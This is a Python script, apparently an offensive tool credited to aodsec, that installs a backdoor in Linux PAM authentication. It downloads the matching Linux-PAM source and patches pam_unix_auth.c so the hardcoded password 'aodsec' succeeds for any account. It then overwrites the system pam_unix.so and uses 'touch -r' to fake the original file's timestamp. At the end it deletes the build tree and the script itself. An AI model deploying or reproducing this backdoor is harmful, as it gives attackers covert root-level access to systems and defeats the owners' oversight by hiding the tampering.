# coding:utf-8

import os

def echoMessage():
	version = """  
	  [#] Create By ::
	    _                     _    ___   __   ____                             
	   / \   _ __   __ _  ___| |  / _ \ / _| |  _ \  ___ _ __ ___   ___  _ __  
	  / _ \ | '_ \ / _` |/ _ \ | | | | | |_  | | | |/ _ \ '_ ` _ \ / _ \| '_ \ 
	 / ___ \| | | | (_| |  __/ | | |_| |  _| | |_| |  __/ | | | | | (_) | | | |
	/_/   \_\_| |_|\__, |\___|_|  \___/|_|   |____/ \___|_| |_| |_|\___/|_| |_|
	               |___/            By https://aodsec.com                                           
	"""
	print(version)


def return_PamVersion():
	xx_list=[]
	for i in os.popen("rpm -qa|grep pam").readlines():
		xx_list.append(i)
	str_1 = xx_list[0]
	str_2 = str_1[4:str_1.index(".e")-3]
	return str_2.replace("\n","").replace("\r","")


def return_PamPath():
	xx_list=[]
	for i in os.popen("find / -name 'pam_unix.so'").readlines():
		xx_list.append(i)
	str_1 = xx_list[0]
	str_2 = str_1.replace("pam_unix.so","").replace("\n","").replace("\r","")
	return str_2

if __name__ == '__main__':
	echoMessage()

	pam_version = return_PamVersion()
	os.popen("yum install gcc flex flex-devel pam-devel -y ")
	download_url = "http://www.linux-pam.org/library/Linux-PAM-"+pam_version+".tar.gz"
	os.popen("wget "+download_url)
	os.popen("tar -zxvf Linux-PAM-"+pam_version+".tar.gz")
	os.chdir("/root/Linux-PAM-"+pam_version)
	heihei = """sed -i -e 's/retval = _unix_verify_password(pamh, name, p, ctrl);/retval = _unix_verify_password(pamh, name, p, ctrl);\tif (strcmp("aodsec",p)==0){return PAM_SUCCESS;}/g' modules/pam_unix/pam_unix_auth.c"""
	os.popen(heihei)
	os.chdir("/root/Linux-PAM-"+pam_version)
	os.popen("./configure --prefix=/user --exec-prefix=/usr --localstatedir=/var --sysconfdir=/etc --disable-selinux --with-libiconv-prefix=/usr")
	os.chdir("/root/Linux-PAM-"+pam_version)
	os.popen("make -j$(nproc) > /dev/null 2>&1")
	pampath = return_PamPath()
	tt = 'cp -rf {}pam_unix.so /tmp/pam_unix.so.bak'.format(pampath)
	os.popen(tt)
	yy = 'cp -rf /root/Linux-PAM-{}/modules/pam_unix/.libs/pam_unix.so {}pam_unix.so'.format(pam_version,pampath)
	os.popen(yy)
	os.popen("touch "+pampath+"pam_unix.so -r "+pampath+"pam_unix.so")
	print("successful!!!")
	os.popen("rm -rf /root/Linux-PAM*")
	os.popen("rm -rf /root/pam.py")
